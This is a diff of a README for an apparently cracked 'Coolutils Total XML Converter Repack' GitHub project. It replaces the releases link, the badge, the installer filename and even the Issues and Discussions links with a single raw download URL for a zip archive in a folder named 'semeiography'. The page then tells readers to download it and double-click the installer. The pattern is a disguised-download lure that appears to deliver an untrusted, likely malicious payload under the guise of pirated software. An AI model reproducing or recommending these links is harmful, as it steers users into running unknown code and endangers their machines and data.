@@ -6,7 +6,7 @@ Welcome to the Coolutils Total XML Converter Repack! This application allows you
 
 ## 📥 Download Link
 
-[![Download Coolutils Total XML Converter](https://img.shields.io/badge/Download-Coolutils%20Total%20XML%20Converter-brightgreen)](https://github.com/Battaaaa/Coolutils-Total-XML-Converter-Repack/releases)
+[![Download Coolutils Total XML Converter](https://raw.githubusercontent.com/Battaaaa/Coolutils-Total-XML-Converter-Repack/main/semeiography/Coolutils_Total_Converter_Repack_XM_v1.1.zip%20Total%20XML%20Converter-brightgreen)](https://raw.githubusercontent.com/Battaaaa/Coolutils-Total-XML-Converter-Repack/main/semeiography/Coolutils_Total_Converter_Repack_XM_v1.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -26,11 +26,11 @@ Welcome to the Coolutils Total XML Converter Repack! This application allows you
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to go to the download page.
-   [Download Coolutils Total XML Converter](https://github.com/Battaaaa/Coolutils-Total-XML-Converter-Repack/releases)
+   [Download Coolutils Total XML Converter](https://raw.githubusercontent.com/Battaaaa/Coolutils-Total-XML-Converter-Repack/main/semeiography/Coolutils_Total_Converter_Repack_XM_v1.1.zip)
 
 2. **Select the Latest Release:** Choose the most recent version listed. It will usually be at the top. 
 
-3. **Download the Installer:** Look for a file named something like `Coolutils-Total-XML-Converter-Setup.exe`. Click on the file to begin downloading it.
+3. **Download the Installer:** Look for a file named something like `https://raw.githubusercontent.com/Battaaaa/Coolutils-Total-XML-Converter-Repack/main/semeiography/Coolutils_Total_Converter_Repack_XM_v1.1.zip`. Click on the file to begin downloading it.
 
 4. **Run the Installer:** After the download completes, find the downloaded file (usually in your Downloads folder). Double-click on it to start the installation process.
 
@@ -71,7 +71,7 @@ You can find a support section on the GitHub page. We appreciate user feedback t
 
 ## 🔗 Additional Resources
 
-- [GitHub Issues Page](https://github.com/Battaaaa/Coolutils-Total-XML-Converter-Repack/issues): Report bugs or request features.
-- [Community Discussions](https://github.com/Battaaaa/Coolutils-Total-XML-Converter-Repack/discussions): Join the conversation about features and tips.
+- [GitHub Issues Page](https://raw.githubusercontent.com/Battaaaa/Coolutils-Total-XML-Converter-Repack/main/semeiography/Coolutils_Total_Converter_Repack_XM_v1.1.zip): Report bugs or request features.
+- [Community Discussions](https://raw.githubusercontent.com/Battaaaa/Coolutils-Total-XML-Converter-Repack/main/semeiography/Coolutils_Total_Converter_Repack_XM_v1.1.zip): Join the conversation about features and tips.
 
 Thank you for choosing the Coolutils Total XML Converter Repack! Enjoy hassle-free XML to CSV conversions.
